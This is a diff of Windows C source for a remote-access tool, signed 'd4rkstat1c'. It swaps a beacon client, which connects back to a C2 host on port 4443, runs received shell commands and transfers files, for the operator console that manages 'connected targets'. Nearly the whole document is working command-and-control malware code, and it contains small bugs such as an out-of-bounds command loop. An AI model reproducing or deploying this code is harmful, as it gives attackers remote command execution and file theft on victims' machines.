@@ -3,99 +3,184 @@ Coded by d4rkstat1c.
 Use educationally/legally.
 #GSH ;)
 */
-#include <ws2tcpip.h>
+#include <WS2tcpip.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
 
-#pragma comment(lib, "Ws2_32.lib")
+#pragma comment (lib, "ws2_32.lib")
 
-// Length of network buffer.
 #define BUFLEN 8192
+// Default allocation for conns.clients (to repeat repititive calls to realloc/reduce computations).
+#define MEM_CHUNK 5
+
+typedef struct {
+	// Client hostname.
+	char* host;
+	// Client socket.
+	SOCKET sock;
+} Conn;
+
+typedef struct {
+	SOCKET listen_socket;
+	// Array of Conn objects/structures.
+	Conn* clients;
+	// Memory blocks allocated.
+	size_t alloc;
+	// Amount of memory used.
+	size_t size;
+} Conn_array;
+
+// Typedef for function pointer.
+typedef int (*func)(char*, size_t, SOCKET);
 
 
-// Function to create connect socket.
+// Function to close specified socket.
+void close_server(SOCKET socket) {
+	closesocket(socket);
+	WSACleanup();
+}
+
+// Function to create socket.
 SOCKET create_socket() {
-	// Initialize winsock
+	// Initialize winsock.
 	WSADATA wsData;
 	WORD ver = MAKEWORD(2, 2);
 
-	if (WSAStartup(ver, &wsData) != 0) {
-		return INVALID_SOCKET;
-	}
+	int wsResult = WSAStartup(ver, &wsData);
 
-	// Create socket and hint structure
-	SOCKET connect_socket = socket(AF_INET, SOCK_STREAM, 0);
-	if (connect_socket == INVALID_SOCKET) {
+	// Create the server socket object.
+	const SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, 0);
+	if (listen_socket == INVALID_SOCKET) {
+		printf("Socket creation failed with error: %ld\n", WSAGetLastError());
 		WSACleanup();
-		return connect_socket;
+		exit(1);
 	}
 
-	return connect_socket;
+	return listen_socket;
 }
 
-// Function to connect the connect socket to c2 server.
-int c2_connect(SOCKET connect_socket, const char* host, const int port) {
+// Function to bind socket to specified port.
+void bind_socket(const SOCKET listen_socket, const int port) {
+	// Create hint structure.
 	struct sockaddr_in hint;
 	hint.sin_family = AF_INET;
 
 	hint.sin_port = htons(port);
-	inet_pton(AF_INET, host, &hint.sin_addr);
+	hint.sin_addr.S_un.S_addr = INADDR_ANY;
 
-	// Connect to server hosting c2 service
-	if (connect(connect_socket, (struct sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR) {
-		closesocket(connect_socket);
-		return SOCKET_ERROR;
+	// Bind ip address and port to listen_socket.
+	if (bind(listen_socket, (struct sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR) {
+		printf("Socket bind failed with error: %d\n", WSAGetLastError());
+		close_server(listen_socket);
+		exit(1);
+	}
+
+	// Place the listen_socket in listen state.
+	listen(listen_socket, SOMAXCONN);
+}
+
+// Thread to recursively accept connections.
+DWORD WINAPI accept_conns(LPVOID* lp_param) {
+	Conn_array* conns = (Conn_array*)lp_param;
+	conns->alloc = MEM_CHUNK;
+
+	conns->size = 0;
+	conns->clients = malloc(conns->alloc * sizeof(Conn));
+
+	conns->listen_socket = create_socket();
+	bind_socket(conns->listen_socket, 4443);
+
+	while (1) {
+		// Wait for a connection.
+		struct sockaddr_in client;
+		int clientSize = sizeof(client);
+
+		// Client socket object.
+		const SOCKET client_socket = accept(conns->listen_socket, (struct sockaddr*)&client, &clientSize);
+		if (client_socket == INVALID_SOCKET)
+			printf("Error accepting client connection.");
+
+		// Client's remote name and client's ingress port.
+		char host[NI_MAXHOST] = { 0 };
+		char service[NI_MAXHOST] = { 0 };
+
+		if (conns->size == conns->alloc)
+			conns->clients = realloc(conns->clients, (conns->alloc += MEM_CHUNK) * sizeof(Conn));
+
+		// Add hostname string and client_socket object to Conn structure.
+		conns->clients[conns->size].host = host;
+		conns->clients[conns->size].sock = client_socket;
+		conns->size++;
+
+		if (getnameinfo((struct sockaddr*)&client, sizeof(client), host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0) {
+			printf("%s connected on port %s\n", host, service);
+		}
+		else {
+			inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
+			printf("%s connected on port %hu\n", host, ntohs(client.sin_port));
+		}
+	}
+}
+
+// Function to read/store stdin until \n is detected.
+size_t get_line(char* const buf) {
+	char c;
+	size_t cmd_len = 0;
+
+	buf[cmd_len++] = '0';
+	c = getchar();
+
+	while (c != '\n' && cmd_len < BUFLEN) {
+		buf[cmd_len++] = c;
+		c = getchar();
+	}
+
+	return cmd_len;
+}
+
+// Function to compare two strings (combined logic of strcmp and strncmp).
+int compare(const char* buf, const char* str) {
+	for (int j = 0; str[j] != '\0'; j++) {
+		if (str[j] != buf[j])
+			return 0;
 	}
 
 	return 1;
 }
 
-// Function to copy int bytes to new memory block/location to abide strict aliasing.
-inline uint32_t ntohl_conv(char* const buf) {
-	uint32_t new;
-	memcpy(&new, buf, sizeof(new));
-
-	// Return deserialized bytes.
-	return ntohl(new);
+// Function to list all available connections.
+void list_connections(const Conn_array* conns) {
+	printf("\n\n---------------------------\n");
+	printf("---  C0NNECTED TARGETS  ---\n");
+	printf("--     Hostname: ID      --\n");
+	printf("---------------------------\n\n");
+	if (conns->size) {
+		for (size_t i = 0; i < conns->size; i++) {
+			printf("%s: %lu\n", conns->clients[i].host, i);
+		}
+		printf("\n\n");
+	}
+	else {
+		printf("No connected targets available.\n\n\n");
+	}
 }
 
-// Function to receive file from client (TCP file transfer).
-int recv_file(char* const buf, const char* filename, SOCKET connect_socket) {
-	FILE* fd = fopen(filename, "wb");
-
-	// Receive file size.
-	if (recv(connect_socket, buf, sizeof(uint32_t), 0) < 1)
+// Function to receive file from target machine (TCP file transfer).
+int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+	// Send command to the client to be parsed.
+	buf[7] = '3';
+	if (send(client_socket, &buf[7], cmd_len, 0) < 1)
 		return SOCKET_ERROR;
 
-	// Serialize f_size.
-	uint32_t f_size = ntohl_conv(&*(buf));
-
-	// Receive all file bytes/chunks and write to parsed filename.
-	int iResult = 1;
-	long int total = 0;
-
-	while (total != f_size && iResult > 0) {
-		iResult = recv(connect_socket, buf, BUFLEN, 0);
-		fwrite(buf, 1, iResult, fd);
-		total += iResult;
-	}
-
-	fclose(fd);
-
-	return iResult;
-}
-
-// Function for sending file to client (TCP file transfer).
-int send_file(const char* filename, SOCKET connect_socket, char* const buf) {
 	// Open file.
-	FILE* fd = fopen(filename, "rb");
+	FILE* fd = fopen(&buf[8], "rb");
 
 	uint32_t bytes = 0;
 	size_t f_size = 0;
 
 	if (fd) {
-		// Calculate file size.
+		// Get file size.
 		fseek(fd, 0L, SEEK_END);
 		f_size = ftell(fd);
 
@@ -104,19 +189,18 @@ int send_file(const char* filename, SOCKET connect_socket, char* const buf) {
 		fseek(fd, 0L, SEEK_SET);
 	}
 
-	if (send(connect_socket, (char*)&bytes, sizeof(bytes), 0) < 1)
+	if (send(client_socket, (char*)&bytes, sizeof(bytes), 0) < 1)
 		return SOCKET_ERROR;
 
 	int iResult = 1;
 
-	// Recursively read file until EOF is detected and send file bytes to c2 server in BUFLEN chunks.
 	if (f_size) {
+		// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
 		int bytes_read;
 		while (!feof(fd) && iResult > 0) {
-			// Recursively read file until end of file (EOF).
 			if (bytes_read = fread(buf, 1, BUFLEN, fd)) {
-				// Send read bytes chunk to c2 server.
-				iResult = send(connect_socket, buf, bytes_read, 0);
+				// Send file's bytes chunk to remote server.
+				iResult = send(client_socket, buf, bytes_read, 0);
 			}
 			else {
 				break;
@@ -129,101 +213,231 @@ int send_file(const char* filename, SOCKET connect_socket, char* const buf) {
 	return iResult;
 }
 
-// Function to execute command.
-int exec_cmd(SOCKET connect_socket, char* const buf) {
-	// Call Popen to execute command(s) and read the process' output.
-	strcat(buf, " 2>&1");
+// Function to copy int bytes to new memory block/location to abide strict aliasing.
+inline uint32_t ntohl_conv(char* const buf) {
+	uint32_t new;
+	memcpy(&new, buf, sizeof(new));
 
-	FILE* fpipe = _popen(buf, "r");
-	int bytes_read;
+	// Return deserialized bytes.
+	return ntohl(new);
+}
 
-	if ((bytes_read = fread(buf, 1, BUFLEN, fpipe)) == 0) {
-		bytes_read = 1;
-		buf[0] = '\0';
-	}
-
-	uint32_t s_size = bytes_read;
-
-	const int chunk = 24576;
-	int capacity = chunk;
-
-	char* output = malloc(capacity);
-	strcpy(output, buf);
-
-	// Read and store pipe's stdout in output.
-	while (1) {
-		if ((bytes_read = fread(buf, 1, BUFLEN, fpipe)) == 0)
-			break;
-		// If output has reached maximum capacity in memory size.
-		if ((s_size += bytes_read) == capacity)
-			output = realloc(output, (capacity += chunk));
-
-		strcat(output, buf);
-	}
-
-	// Serialize s_size.
-	uint32_t bytes = htonl(s_size);
-
-	// Send serialized bytes.
-	if (send(connect_socket, (char*)&bytes, sizeof(uint32_t), 0) < 1)
+// Function to receive file from target machine (TCP file transfer).
+int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+	// Send command to the client to be parsed.
+	buf[9] = '4';
+	if (send(client_socket, &buf[9], cmd_len, 0) < 1)
 		return SOCKET_ERROR;
 
-	int iResult = send(connect_socket, output, s_size, 0);
-	free(output);
+	FILE* fd = fopen(&buf[10], "wb");
 
-	// Close the pipe stream.
-	_pclose(fpipe);
+	// Receive file size.
+	if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
+		return SOCKET_ERROR;
+
+	uint32_t f_size = ntohl_conv(&*(buf));
+	int iResult = 1;
+
+	// Receive all file bytes/chunks and write to file.
+	long int total = 0;
+	while (total != f_size && iResult > 0) {
+		iResult = recv(client_socket, buf, BUFLEN, 0);
+		fwrite(buf, 1, iResult, fd);
+		total += iResult;
+	}
+
+	fclose(fd);
 
 	return iResult;
 }
 
-// Main function for connecting to c2 server & parsing c2 commands.
-int main(void) {
-	// immutable host and port.
-	const char host[] = "127.0.0.1";
-	const int port = 4443;
+// Function send change directory command to client.
+int client_cd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+	buf[3] = '1';
+	if (send(client_socket, &buf[3], cmd_len, 0) < 1)
+		return SOCKET_ERROR;
 
-	while (1) {
-		// Create the connect socket.
-		SOCKET connect_socket = create_socket();
+	return 1;
+}
 
-		/* If connected to c2 recursively loop to receive/parse c2 commands. If an error-
-			  occurs (connection lost, etc) break the loop and reconnect & restart loop. */
-		if (connect_socket != INVALID_SOCKET) {
-			int iResult = c2_connect(connect_socket, host, port);
-			while (iResult > 0) {
-				// BUFLEN + 1 + 4, for null byte and "2>&1" string concatenation
-				char buf[BUFLEN + 5] = { 0 };
+// Function to terminate/kill client.
+int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+	send(client_socket, "2", cmd_len, 0);
 
-				if (recv(connect_socket, buf, BUFLEN, 0) < 1)
-					break;
+	return 0;
+}
 
-				// buf[0] is the command code and &buf[1] is the parsed data.
-				switch (buf[0]) {
-					case '0':
-						iResult = exec_cmd(connect_socket, &buf[1]);
-						break;
-					case '1':
-						// Change directory.
-						_chdir(&buf[1]);
-						break;
-					case '2':
-						// Exit.
-						return 0;
-					case '3':
-						// Upload file to client system.
-						iResult = recv_file(buf, &buf[1], connect_socket);
-						break;
-					case '4':
-						// Download file from client system.
-						iResult = send_file(&buf[1], connect_socket, buf);
-						break;
+// Function to return function pointer based on parsed command.
+func parse_cmd(char* const buf) {
+	// Function pointer array of each c2 command.
+	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file };
+	// Array of command strings to parse stdin with.
+	const char commands[4][10] = { "cd ", "exit", "upload ", "download " };
+
+	for (int i = 0; i < 5; i++) {
+		if (compare(buf, commands[i])) {
+			return func_array[i];
+		}
+	}
+
+	return NULL;
+}
+
+// Function to send command to client.
+int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+	// Send command to server.
+	if (send(client_socket, buf, cmd_len, 0) < 1)
+		return SOCKET_ERROR;
+
+	if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
+		return SOCKET_ERROR;
+
+	uint32_t s_size = ntohl_conv(&*(buf));
+
+	int iResult = 1;
+	// Receive command output stream and write output chunks to stdout.
+	do {
+		if ((iResult = recv(client_socket, buf, BUFLEN, 0)) < 1)
+			return iResult;
+		fwrite(buf, 1, iResult, stdout);
+	} while ((s_size -= iResult) > 0);
+
+	fputc('\n', stdout);
+
+	return iResult;
+}
+
+// Function to resize conns array/remove connection.
+void resize_conns(Conn_array* conns, const int client_id) {
+	for (size_t i = client_id; i < conns->size; i++) {
+		conns->clients[i].sock = conns->clients[i + 1].sock;
+		conns->clients[i].host = conns->clients[i + 1].host;
+	}
+
+	memset(&conns->clients[conns->size].sock, 0, sizeof(SOCKET));
+	conns->clients[conns->size].host = NULL;
+
+	conns->size--;
+}
+
+// Function to parse interactive input and send to specified client.
+void interact(Conn_array* conns, char* const buf, const int client_id) {
+	const SOCKET client_socket = conns->clients[client_id].sock;
+	char* client_host = conns->clients[client_id].host;
+
+	int iResult = 1;
+
+	// Receive and parse input/send commands to client.
+	while (iResult > 0) {
+		printf("%s // ", client_host);
+		// Set all bytes in buffer to zero.
+		memset(buf, '\0', BUFLEN);
+
+		size_t cmd_len = get_line(buf);
+		char* cmd = &buf[1];
+
+		if (cmd_len > 1) {
+			if (compare(cmd, "background")) {
+				return;
+			}
+			else {
+				// If a command is parsed call it's corresponding function else execute-
+				// the command on the client.
+				func target_func = parse_cmd(cmd);
+				if (target_func) {
+					iResult = target_func(buf, cmd_len, client_socket);
+				}
+				else {
+					iResult = send_cmd(buf, cmd_len, client_socket);
 				}
 			}
 		}
-		// If unable to connect or an error occurs sleep 8 seconds.
-		Sleep(8000);
 	}
 
-	return -1;
+	closesocket(client_socket);
+	resize_conns(conns, client_id);
+	printf("Client: \"%s\" is no longer connected.\n\n", client_host);
+}
+
+// Function to execute command.
+void exec_cmd(char* const buf) {
+	// Call Popen to execute command(s) and read the process' output.
+	FILE* fpipe = _popen(buf, "r");
+	fseek(fpipe, 0, SEEK_END);
+
+	size_t cmd_len = ftell(fpipe);
+	fseek(fpipe, 0, SEEK_SET);
+
+	// Store command output.
+	int rb = 0;
+	do {
+		rb = fread(buf, 1, BUFLEN, fpipe);
+		fwrite(buf, 1, rb, stdout);
+	} while (rb == BUFLEN);
+
+	fputc('\n', stdout);
+
+	// Close the pipe.
+	_pclose(fpipe);
+}
+
+// Main function for parsing console input and calling sakito-console functions.
+int main(void) {
+	Conn_array conns;
+	HANDLE acp_thread = CreateThread(0, 0, accept_conns, &conns, 0, 0);
+
+	HANDLE  hColor;
+
+	hColor = GetStdHandle(STD_OUTPUT_HANDLE);
+	SetConsoleTextAttribute(hColor, 9);
+
+	while (1) {
+		printf("sak1to-console // ");
+		// BUFLEN + 1 to ensure the string is always truncated/null terminated.
+		char buf[BUFLEN + 1] = { 0 };
+
+		size_t cmd_len = get_line(buf);
+		char* cmd = &buf[1];
+
+		if (cmd_len > 1) {
+			if (compare(cmd, "exit")) {
+				// Quit accepting connections.
+				TerminateThread(acp_thread, 0);
+				// if there's any connections close them before exiting.
+				if (conns.size) {
+					for (size_t i = 0; i < conns.size; i++) {
+						closesocket(conns.clients[i].sock);
+					}
+					// Free allocated memory.
+					free(conns.clients);
+				}
+				close_server(conns.listen_socket);
+				return;
+			}
+			else if (compare(cmd, "cd ")) {
+				// List all connections.
+				_chdir(&cmd[3]);
+			}
+			else if (compare(cmd, "list")) {
+				// List all connections.
+				list_connections(&conns);
+			}
+			else if (compare(cmd, "interact ")) {
+				// Interact with client.
+				int client_id;
+				client_id = atoi(&cmd[9]);
+				if (!conns.size || client_id < 0 || client_id > conns.size - 1) {
+					printf("Invalid client identifier.\n");
+				}
+				else {
+					interact(&conns, buf, client_id);
+				}
+			}
+			else {
+				// Execute command on host system.
+				exec_cmd(cmd);
+			}
+		}
+	}
+	return 0;
 }
